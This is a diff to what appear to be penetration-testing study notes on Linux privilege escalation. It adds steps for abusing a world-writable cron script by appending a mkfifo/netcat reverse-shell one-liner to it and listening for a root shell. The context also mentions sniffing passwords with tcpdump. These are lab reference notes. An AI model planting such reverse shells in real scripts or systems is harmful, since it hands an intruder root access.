@@ -1384,7 +1384,19 @@ Reference
     `watch -n 1 "ps -aux | grep pass"`
   - Use tcpdump to sniff password > user:root,pass:lab  
     `sudo tcpdump -i lo -A | grep "pass"`   
-- insecure file permission  
+- insecure file permission > /bin/bash /home/joe/.scripts/user_backups.sh
+  - inspect cron log file
+    `grep "CRON" /var/log/syslog`
+  - inspect content and permisission of script > every user can write the file -rwxrwxrw-
+    `cat /home/joe/.scripts/user_backups.sh`  
+    `ls -lah /home/joe/.scripts/user_backups.sh`  
+  - insert one-liner user_backs.sh
+    ```
+    echo >> user_backups.sh
+    echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 1234 >/tmp/f" >> user_backups.sh
+    ```
+  - get a root shell from target
+    `nc -lnvp 1234`
 - abuse system linux components  
 
 ### 19. Port redirection and SSH tunneling
